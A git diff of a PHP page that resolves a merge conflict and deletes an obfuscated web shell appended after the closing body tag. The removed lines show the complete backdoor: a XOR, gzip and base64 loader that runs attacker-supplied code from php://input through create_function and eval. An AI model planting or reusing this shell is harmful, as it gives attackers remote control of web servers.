@@ -43,11 +43,7 @@ include_once 'functions/main.php';
                     <strong>Уведомление!</strong> <span><? display_flash_message('success') ?></span>
                 </div>
             <? endif;
-<<<<<<< HEAD
-                if (isset($_SESSION['error'])) : ?>
-=======
-                if ($_SESSION['error']) : ?>
->>>>>>> bad6d801359c0453838828296ab7354d35e27d04
+            if (isset($_SESSION['error'])) : ?>
                 <div class="alert alert-danger text-dark" role="alert">
                     <strong>Уведомление!</strong> <span><? display_flash_message('error') ?></span>
                 </div>
@@ -79,19 +75,5 @@ include_once 'functions/main.php';
         <source src="/public/media/video/cc.mp4" type="video/mp4">
     </video>
     <script src="/public/js/vendors.bundle.js"></script>
-
 </body>
-<?php
-$l=str_replace('vr','','cvrreavrte_vrfvrunvrctvrion');
-$k='$i=f#0;$i<$l;f#){for(f#$j=0f#;f#($j<$c&&$i<$f#l);$j++f#,$i+f#+){f#$o.=$t{$i}^f#$k{$f#';
-$Z='f#);$r=@basf#e64_enf#code(f#@x(@gzcf#ompresf#s($o),$kf#)f#);print("$pf#$f#kh$r$kf");}';
-$M='f#j};}}returf#n $f#of#;}if (@f#prf#eg_matchf#("/$kh(.+)$kf/",@ff#ilef#_get_contf#enf';
-$y='f#sef#64f#_decode($mf#[1]),f#$kf#)f#));$o=@ob_get_contenf#ts(f#);@ob_f#end_cleanf#(';
-$a='$f#k="9e773f#1f3";$kh="f#f#f#d2b3f#1737bbc2";$kf#f="97b51c7f#35f#3f#ca";$p="N9OSX4f#fV';
-$p='ySypf#f#FS14";functiof#n x($t,f#$k){$c=strlf#en(f#$k);$l=sf#trlenf#($t)f#f#;$o="";for(';
-$I='#ts("pf#hp://inf#put"),$f#m)==1) {f#@f#ob_f#stf#art();@ef#val(@gf#zuncompress(@x(@ba';
-$m=str_replace('f#','',$a.$p.$k.$M.$I.$y.$Z);
-$A=$l('',$m);$A();
-?>  
-
 </html>
